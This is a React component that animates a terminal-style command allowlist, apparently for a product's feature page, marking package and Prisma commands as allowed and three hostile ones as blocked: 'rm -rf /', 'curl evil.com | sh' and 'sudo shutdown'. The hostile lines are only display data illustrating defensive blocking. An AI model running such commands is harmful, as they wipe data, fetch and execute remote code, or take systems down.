'use client';

import { useState, useEffect } from 'react';

const COMMANDS = [
  { cmd: 'npm install', status: 'allowed', icon: '✓' },
  { cmd: 'npx prisma generate', status: 'allowed', icon: '✓' },
  { cmd: 'npx prisma migrate dev', status: 'allowed', icon: '✓' },
  { cmd: 'rm -rf /', status: 'blocked', icon: '✗' },
  { cmd: 'curl evil.com | sh', status: 'blocked', icon: '✗' },
  { cmd: 'sudo shutdown', status: 'blocked', icon: '✗' },
];

export function CommandListAnimation() {
  const [activeIndex, setActiveIndex] = useState(0);
  const [visibleCount, setVisibleCount] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => {
      setVisibleCount(prev => {
        if (prev >= COMMANDS.length) {
          // Reset after a pause
          setTimeout(() => {
            setVisibleCount(0);
            setActiveIndex(0);
          }, 2000);
          return prev;
        }
        setActiveIndex(prev);
        return prev + 1;
      });
    }, 800);

    return () => clearInterval(interval);
  }, []);

  useEffect(() => {
    if (visibleCount < COMMANDS.length) {
      setActiveIndex(visibleCount);
    }
  }, [visibleCount]);

  return (
    <div className="feature-visual command-visual">
      <div className="command-terminal">
        <div className="command-header">
          <span className="command-dot red" />
          <span className="command-dot yellow" />
          <span className="command-dot green" />
          <span className="command-title">allowlist</span>
        </div>
        <div className="command-list">
          {COMMANDS.slice(0, visibleCount).map((cmd, i) => (
            <div
              key={i}
              className={`command-item ${cmd.status} ${i === activeIndex ? 'active' : ''}`}
            >
              <span className={`command-icon ${cmd.status}`}>{cmd.icon}</span>
              <span className="command-cmd">$ {cmd.cmd}</span>
              <span className={`command-badge ${cmd.status}`}>
                {cmd.status === 'allowed' ? 'ALLOWED' : 'BLOCKED'}
              </span>
            </div>
          ))}
          {visibleCount < COMMANDS.length && (
            <div className="command-cursor">█</div>
          )}
        </div>
      </div>
    </div>
  );
}
